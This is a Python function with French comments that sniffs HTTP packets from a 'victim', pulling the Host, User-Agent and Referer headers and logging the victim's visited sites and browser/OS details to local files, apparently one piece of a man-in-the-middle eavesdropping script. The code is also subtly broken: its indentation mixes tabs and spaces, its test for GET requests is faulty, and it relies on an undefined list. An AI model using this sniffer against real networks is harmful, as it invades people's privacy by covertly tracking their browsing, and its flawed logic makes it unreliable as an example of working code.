
def http_header(packet):
	#On ouvre un fichier pour enregistrer les sites visites par la victime
    fichier = open("capture.txt", "w")
    #On ouvre un autre fichier pour enregistrer les donnes user-agent de la victime
    fichierInf = open("nomOS.txt", "w")
    #On traite le packet sous forme texte
    http_packet=str(packet)
    #Si on trouve un GET dans le paquet on est dans le cas d'un paquet html
    if http_packet.find('GET'):
    	#On recupere les donnees Raw du paquet
		ret = "\n".join(packet.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
		#On recherche les informations sur l'hote dans les donnes Raw
		host = re.search('[Hh]ost: ', ret)
		if host:
		    try:
		    	#On recupere les donnees hotes
				hostStg = ret.split('Host: ', 1)[1]
				#On recupere, si il y en a des donnes sur l'user-agent
				useragent = re.search('User-Agent: ', hostStg) 
				if useragent:
					#Si il y a des donnes user-agent on les enregistre dans le fichier
					user = hostStg.split('User-Agent: ', 1)[1]
					userA = user.split('\n', 1)[0]
					fichierInf.write(userA)
				#Add pour recuperer l'adresse web du serveur
				add = hostStg.split('\n', 1)[0]
				#On cherche si il y a l'adresse precise du site visite par la victime
				url = re.search('Referer: ', hostStg)
				if url:
					#Si c'est le cas et si elle n'est pas deja dans la liste, on l'ajoute 
				    adu = hostStg.split('Referer: ', 1)[1]
				    addurl = adu.split('\n', 1)[0]
				    if not(("Addresse exacte : " + addurl) in listeAddresse):
				        listeAddresse.append("Addresse exacte : " + addurl)
				else: 
					#sinon on ajoute dans la liste le serveur qui donne aussi des informations sur les pages visitees par la victime
				    if not(("Serveur : " + add) in listeAddresse):
				        listeAddresse.append("Serveur : " + add)
		    except:
				pass
			#On ecrit dans le fichier les donnes de la liste
		    for i in range(len(listeAddresse)):
				fichier.write(listeAddresse[i] + "\n")	
		

	

